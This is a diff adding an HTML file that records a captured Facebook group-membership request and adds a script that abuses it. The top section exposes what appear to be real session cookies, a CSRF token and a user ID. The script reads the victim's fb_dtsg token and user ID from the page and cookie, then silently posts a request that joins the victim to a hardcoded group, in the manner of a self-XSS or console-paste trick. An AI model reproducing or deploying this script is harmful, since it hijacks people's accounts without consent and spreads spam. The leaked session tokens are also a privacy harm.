@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+</head>
+<body>
+
+<p>
+	PARAM : __pc=EXP1:DEFAULT
+
+	POST : __a	1
+	__dyn	5V5yAW8-aloAwmgDxyG8EigmzFEbEyGgyi8zQC-C26m6oKezob4q8zUK5UcU-2CEaUgDxti28y2HrzHyQFbDG4Xxm7GUgyUf9VVpo9XCz9qCzEbe6bUG49Elxq
+	__req	1x
+	__rev	2207931
+	__user	100011213955230
+	fb_dtsg	AQFJZu71NRZD:AQE0XUd7Nka3
+	group_id	136681739809626
+	nctr[_mod]	pagelet_group_
+	ref	group_jump_header
+	ttstamp	265817074901175549788290685865816948888510055781079751
+
+	Source : 
+	ref=group_jump_header&group_id=136681739809626&nctr[_mod]=pagelet_group_&__user=100011213955230&__a=1&__dyn=5V5yAW8-aloAwmgDxyG8EigmzFEbEyGgyi8zQC-C26m6oKezob4q8zUK5UcU-2CEaUgDxti28y2HrzHyQFbDG4Xxm7GUgyUf9VVpo9XCz9qCzEbe6bUG49Elxq&__req=1x&fb_dtsg=AQFJZu71NRZD%3AAQE0XUd7Nka3&ttstamp=265817074901175549788290685865816948888510055781079751&__rev=2207931
+
+
+
+
+	https://www.facebook.com/ajax/groups/membership/r2j.php?__pc=EXP1%3ADEFAULT
+
+	REQUEST HEADER : 
+
+	POST /ajax/groups/membership/r2j.php?__pc=EXP1%3ADEFAULT HTTP/1.1
+
+	Host: www.facebook.com
+
+	User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0
+
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+	Accept-Language: en-US,en;q=0.5
+
+	Accept-Encoding: gzip, deflate
+
+	Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+	Referer: https://www.facebook.com/groups/qhonline/?fref=ts
+
+	Content-Length: 352
+
+	Cookie: datr=dibUVls2PN-MH-6aT4aPugba; fr=0DRsssRKwjw3J0ad1.AWXp9YsbDySlj9cvzb6zEM-mWmc.BW1CaI.jN.FbW.0.AWUeWXvV; lu=Sgc2HQQay0_wo07TQEZG8WMw; c_user=100011213955230; xs=231%3AX8QhzyKXFlaR6w%3A2%3A1456884071%3A9832; csm=2; s=Aa5v-eP6zACzUv-h.BW1kln; pl=n; p=-2; act=1456886622315%2F13; a11y=%7B%22sr%22%3A0%2C%22sr-ts%22%3A1456884958006%2C%22jk%22%3A0%2C%22jk-ts%22%3A1456884958006%2C%22kb%22%3A6%2C%22kb-ts%22%3A1456884958006%2C%22hcm%22%3A0%2C%22hcm-ts%22%3A1456884958006%7D; presence=EDvF3EtimeF1456886590EuserFA21B11213955230A2EstateFDsb2F1456885115929Et2F_5bDiFA2user_3a1B10618362684A2ErF1C_5dElm2FA2user_3a1B10618362684A2Euct2F1456884514318EtrFA2loadA2EtwF2939047226EatF1456886589799G45688659B2CEchFDp_5f1B11213955230F10CC; wd=1442x327; x-src=%2Fajax%2Fgroups%2Fmembership%2Fr2j.php%7Cpagelet_group_
+
+	Connection: keep-alive
+
+	Pragma: no-cache
+
+	Cache-Control: no-cache
+
+</p>
+
+<script type="text/javascript">
+
+var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
+console.log(fb_dtsg);
+var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
+console.log(user_id);
+var gid = 383929321687618;//document.getElementsByName("group_id")[0].value;
+console.log(gid);
+var httpwp = new XMLHttpRequest();
+var urlwp = '/ajax/groups/membership/r2j.php?__pc=EXP1:DEFAULT';
+var paramswp = '&__a=1&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&ttstamp=' + '&__rev=' + '&nctr[_mod]=pagelet_group_' + '&__dyn=5V5yAW8-aloAwmgDxyG8EigmzFEbEyGgS8zQC-C26m6oKezob4q8zUK5UcU-2CEaUgDxti28y4EnSUWUJaiVWxeUlxWK4aDiwVBVVpoS6rCz9q-EW5omUoLyEgCxm5E' + '&__req=1x';
+httpwp['open']('POST', urlwp, true);
+httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
+httpwp['setRequestHeader']('Content-length', paramswp['length']);
+httpwp['setRequestHeader']('Connection', 'keep-alive');
+httpwp['send'](paramswp);
+
+</script>
+</body>
+</html>
